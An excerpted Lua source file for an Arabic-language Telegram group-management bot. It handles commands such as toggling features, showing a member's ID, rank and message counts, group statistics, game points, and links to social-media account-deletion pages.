send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 么 تم تعطيل الردود العامه' 
else
Text = '\n 么 بالتاكيد تم تعطيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 么 تم تفعيل الايدي بالصور' 
else
Text = '\n 么 بالتاكيد تم تفعيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 么 تم تعطيل الايدي بالصوره' 
else
Text = '\n 么 بالتاكيد تم تعطيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_, msg.id_,' 么 ايديه ➥ '..iduser..'\n 么 معرفه ➥ '..username..'\n 么 رتبته ➥ '..rtp..'\n 么 تعديلاته ➥ '..edit..'\n 么 نقاطه ➥ '..NUMPGAME..'\n 么 جهاته ➥ '..Contact..'\n 么 رسائله ➥ '..Msguser..'')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
...
send(msg.chat_id_, msg.id_,' 么 المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
...
send(msg.chat_id_, msg.id_,' 么 رتبتك في البوت » '..rtp)
end
if text == "اسمي"  then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.first_name_  then
first_name = ' 么 اسمك الاول » {`'..(result.first_name_)..'`}'
else
first_name = ''
end   
if result.last_name_ then 
last_name = ' 么 اسمك الثاني » {`'..result.last_name_..'`}' 
else
last_name = ''
end      
...
if text == 'ايديي' then
send(msg.chat_id_, msg.id_,' 么 ايديك » '..msg.sender_user_id_)
end
...
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,' 么 الايدي » ('..iduser..')\n 么 المعرف » ('..username..')\n 么 الرتبه » ('..rtp..')\n 么 نوع الكشف » بالرد')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
...
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_," 么 البوت ليس ادمن \n") 
return false  
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
local amir = ' 么 عدد الادمنيه : '..data.administrator_count_..
'\n\n 么 عدد المطرودين : '..data.kicked_count_..
'\n\n 么 عدد الاعضاء : '..data.member_count_..
'\n\n 么 عدد رسائل الجروب : '..(msg.id_/2097152/0.5)..
'\n\n 么  اسم الجروب : ['..ta.title_..']'
...
send(msg.chat_id_, msg.id_, '\n 么 عذرا لا استطيع طرد ( '..Rutba(msg.sender_user_id_,msg.chat_id_)..' )')
return false
end
...
send(msg.chat_id_, msg.id_,' 么 عذرا لا استطيع طرد ادمنية الجروب') 
return false  
end
if data and data.ID and data.ID == 'Ok' then
send(msg.chat_id_, msg.id_,' 么 تم طردك بنجاح من الروم ياريت تاخد الباب ف ايدك 😹😒') 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = msg.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
return false
end
end,nil)   
else
send(msg.chat_id_, msg.id_,' 么 تم تعطيل امر اطردني اترزع هنا مش هتخرج 😹🌚') 
end
end
...
send(msg.chat_id_, msg.id_,' 么 المعرف غلط ') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
send(msg.chat_id_, msg.id_,' 么 لا استطيع تاك معرف قنوات') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,' 么 لا استطيع اتاك معرف بوتات') 
return false  
end
...
if result.id_ then
send(msg.chat_id_, msg.id_,' 么 تعالي هنا عاوزينك 🌚 [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
else
send(msg.chat_id_, msg.id_,' 么 تم تعطيل امر تاك') 
end
return false
end
...
send(msg.chat_id_, msg.id_,' 么 انت منشئ الجروب') 
return false
end
...
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' 么 الشخص الذي قام باضافتك هو » '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,' 么 انت دخلت بنفسك محدش ضافك 😹🙂') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,' 么 تم تعطيل امر مين ضافني') 
end
end

if text == 'تفعيل ضافني' and Manager(msg) then   
if database:get(bot_id..'Added:Me'..msg.chat_id_) then
Text = ' 么 تم تفعيل امر مين ضافني'
database:del(bot_id..'Added:Me'..msg.chat_id_)  
else
Text = ' 么 بالتاكيد تم تفعيل امر مين ضافني'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 么 تم تعطيل امر مين ضافني'
else
Text = '\n 么 بالتاكيد تم تعطيل امر مين ضافني'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل تاك' and Manager(msg) then   
if database:get(bot_id..'Seh:User'..msg.chat_id_) then
Text = ' 么 تم تفعيل امر تاك'
database:del(bot_id..'Seh:User'..msg.chat_id_)  
else
Text = ' 么 بالتاكيد تم تفعيل امر تاك'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
database:del(bot_id..'Mod:User'..msg.chat_id_)
database:del(bot_id..'Special:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 么 تم تنزيل الكل من الرتب الاتيه \n 么 المميزين ، الادمنيه ، المدراء ، المنشئين \n')
end
...
Text = '\n 么 بالتاكيد تم تعطيل امر تاك'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل اطردني' and Manager(msg) then   
if database:get(bot_id..'Cick:Me'..msg.chat_id_) then
Text = ' 么 تم تفعيل امر اطردني'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = ' 么 بالتاكيد تم تفعيل امر اطردني'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 么 تم تعطيل امر اطردني اترزع هنا مش هتخرج 😹🌚'
else
Text = '\n 么 بالتاكيد تم تعطيل امر اطردني'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "صورتي"  then
...
if not my_ph then
send(msg.chat_id_, msg.id_," 么 الصوره معطله") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," 么 عدد صورك ➥ "..result.total_count_.." صوره‌‏", msg.id_, msg.id_, "md")
else
...
send(msg.chat_id_, msg.id_,'么 تم تغيير الايدي ارسل ايدي لرؤيته')
end
...
local amira = {
" 么 قمر ياروحي ❤️🥺",
" 么 غير الصوره اللي عفنت دي 🙂",
" 么 عرفنا انك عسل خلاص بقي 🤷‍♂️🥱",
" 么 يتي القمر نزل الارض يعمل اي🙈🥺",
" 么 انا دوخت من حلاوه الصوره 🥺❤️",
" 么 اومال لو صورتك حلوه كنت عملت اي 😂️",
}
...
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, amir.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n 么 ايديك ➥ '..msg.sender_user_id_..'\n 么 معرفك ➥ '..username..'\n 么 رتبتك ➥ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n 么 موقعك ➥ '..rtpa..'\n 么 تفاعلك ➥ '..Total_Msg(Msguser)..'\n 么 رسائلك ➥ '..Msguser..'\n 么 نسبه تفاعلك ➥ '..string.sub(nspatfa, 1,5)..' %\n 么 السحكات ➥ '..edit..'\n 么 نقاطك ➥ '..NUMPGAME..'\n')
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n 么 ايديك ➥ '..msg.sender_user_id_..'\n 么 معرفك ➥ '..username..'\n 么 رتبتك ➥ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n 么 موقعك ➥ '..rtpa..'\n 么 تفاعلك ➥ '..Total_Msg(Msguser)..'\n 么 رسائلك ➥ '..Msguser..'\n 么 نسبه  تفاعلك ➥ '..string.sub(nspatfa, 1,5)..' %\n 么 السحكات ➥ '..edit..'\n 么 نقاطك ➥ '..NUMPGAME..']\n')
else
send(msg.chat_id_, msg.id_, '\n 么 الصوره ➥ ليس لديك صور في حسابك'..'[\n 么 ايديك ➥ '..msg.sender_user_id_..'\n 么 معرفك ➥ '..username..'\n 么 رتبتك ➥ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n 么 موقعك ➥ '..rtpa..'\n 么 تفاعلك ➥ '..Total_Msg(Msguser)..'\n 么 رسائلك ➥ '..Msguser..'\n 么 نسبه تفاعلك ➥ '..string.sub(nspatfa, 1,5)..' %\n 么 السحكات ➥ '..edit..'\n 么 نقاطك ➥ '..NUMPGAME..']\n')
end 
end
end
else
...
if Num == 0 then 
Text = ' 么  ليس لديك سحكات'
else
Text = ' 么 عدد سحكاتك *» { '..Num..' } *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "مسح سحكاتي" or text == "حذف سحكاتي" then  
send(msg.chat_id_, msg.id_,' 么 تم مسح سحكاتك'  )  
database:del(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_)
end
if text == "مسح جهاتي" or text == "حذف جهاتي" then  
send(msg.chat_id_, msg.id_,' 么 تم مسح جهاتك'  )  
...
if Num == 0 then 
Text = ' 么 لم تقم بأضافه احد'
else
Text = ' 么 عدد جهاتك *» { '..Num..' } *'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
-- vardump(data) 
BOYKAdx(msg.chat_id_, msg.id_, ' 么 ايدي المجموعة » ( '..msg.chat_id_..' )\n 么 عدد الادمنيه » ( *'..data.administrator_count_..' )*\n 么 عدد المحظورين » ( *'..data.kicked_count_..' )*\n 么 عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
send(msg.chat_id_, msg.id_," 么 تم اضافة له {"..numadded..'} من الرسائل')  
end
------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_, ' 么 ارسل لي عدد الرسائل الان') 
return false
end
------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_, ' 么 ارسل لي عدد النقاط التي تريد اضافتها') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
...
send(msg.chat_id_, msg.id_," 么 تم اضافة له {"..Num..'} من النقاط')  
end
...
if Num == 0 then 
Text = ' 么 لم تلعب اي لعبه للحصول على نقاط'
else
Text = ' 么 عدد نقاطك التي ربحتها هيه *» { '..Num..' } نقاط *'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_,msg.id_,"\n* 么 لا استطيع البيع اقل من 1 *") 
return false 
end
if tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,' 么 ليس لديك نقاط في الالعاب\n 么 اذا كنت تريد ربح نقاط \n 么 ارسل الالعاب وابدأ اللعب ! ') 
else
local NUM_GAMES = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,'\n 么 ليس لديك نقاط في هذه لعبه \n 么 لزيادة نقاطك في اللعبه \n 么 ارسل الالعاب وابدأ اللعب !') 
return false 
end
local NUMNKO = (NUMPY * 50)
database:decrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,NUMPY)  
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,' 么 تم خصم *» { '..NUMPY..' }* من نقاطك \n 么 وتم اضافة* » { '..(NUMPY * 50)..' } رساله الى رسالك *')
end 
return false 
end
...
send(msg.chat_id_,msg.id_,'\n 么 اهلا عزيزي البوت هنا ادمن'..'\n 么 وصلاحياته هي ↓ \nٴ━━━━━━━━━━'..'\n 么 تغيير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n 么 حذف الرسائل ↞ ❴ '..delete..' ❵'..'\n 么 حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n 么 دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n 么 تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n 么 اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
...
send(msg.chat_id_, msg.id_," 么 تم تغيير رد المطور الى » "..Teext)
end
...
if not Mod(msg) then
send(msg.chat_id_, msg.id_,' 么 هاذا الامر خاص بالادمنيه\n 么 ارسل {م10} لعرض اوامر الاعضاء')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
Text = [[
*么 اهلا انتツفي اوامر البوت么*
ٴ◎ ══════ ❈ ══════ ◎ٴ
*么 م1 ◂ اوامر الحمايه*
*么 م2 ◂ اوامر تعطيل ~ تفعيل*
*么 م3 ◂ اوامر ضع ~ اضف*
*么 م4 ◂ اوامر مسح ~ حذف*
*么 م5 ◂ اوامر تنزيل+رفع+التغيير*
*么 م6 ◂ اوامر الجروب*
*么 م7 ◂ اوامر التسليه*
*么 م8 ◂ اوامر مطور البوت*
*么 م9 ◂ اوامر مطور الاساسي* 
*么 م10 ◂ اوامر الاعضاء*
ٴ◎ ══════ ❈ ══════ ◎ٴ
么 .[ٴ 𝐍𝐀𝐒𝐀么](t.me/SOURCENASA)➢ 
]]
send(msg.chat_id_, msg.id_,(help_text or Text)) 
return false
end
if text == "تعطيل الزخرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_, '么 تم تعطيل الزخرفه')
database:set(bot_id.." amir:zhrf_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الزخرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_,'么 تم تفعيل الزخرفه')
...
send(msg.chat_id_, msg.id_, t..'ٴ么ٴ◎ ══════ ❈ ══════ ◎ٴ么○ٴ\n么 彡 .[𝚂𝙾𝚄𝚁𝚂𝙴 𝙽𝙰𝚂𝙰⏜ ](t.me/SOURCENASA)➢ ')
end
if text == "تعطيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_, '么 تم تعطيل الابراج')
database:set(bot_id.." amir:brj_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_,'么 تم تفعيل الابراج')
...
send(msg.chat_id_, msg.id_, '么 تم تعطيل حساب العمر')
...
send(msg.chat_id_, msg.id_,'么 تم تفعيل حساب العمر')
...
t =[[
رابط الحذف في جميع مواقع التواصل 么
فكر قبل لا تتسرع وتروح
ٴ≪━━━━━𝐍𝐀𝐒𝐀━━━━━≫ٴ
 么 رابط حذف  [Telegram](https://my.telegram.org/auth?to=delete) ܁
 么 رابط حذف [instagram](https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/) ܁
 么 رابط حذف [Facebook](https://www.facebook.com/help/deleteaccount) ܁
 么 رابط حذف [Snspchat](https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount) ܁
]]
send(msg.chat_id_, msg.id_,t) 
return false
end
...
send(msg.chat_id_, msg.id_,' 么 تم حذف الامر')  
else
send(msg.chat_id_, msg.id_,' 么 لا يوجد امر بهاذا الاسم')  
end
...
send(msg.chat_id_, msg.id_, ' 么 تم تعطيل اوامر التسليه')
database:set(bot_id.."Fun_Bots:"..msg.chat_id_,"true")
end
if (text and text == "تفعيل اوامر التسليه") then 
send(msg.chat_id_, msg.id_, '  么 تم تفعيل اوامر التسليه')
...
send(msg.chat_id_,0,''..t..'\n◎ ══════ ❈ ══════ ◎\n 么 تم التعديل على الميديا\n 么 الشخص الي قام بالتعديل\n 么 ايدي الشخص ◂ '..result.sender_user_id_..'\n 么 معرف الشخص»{ '..users..' }') 
end,nil)
...
if BOYKA1_Msg then    
send(msg.chat_id_, msg.id_," 么 "..BOYKA1_Msg)
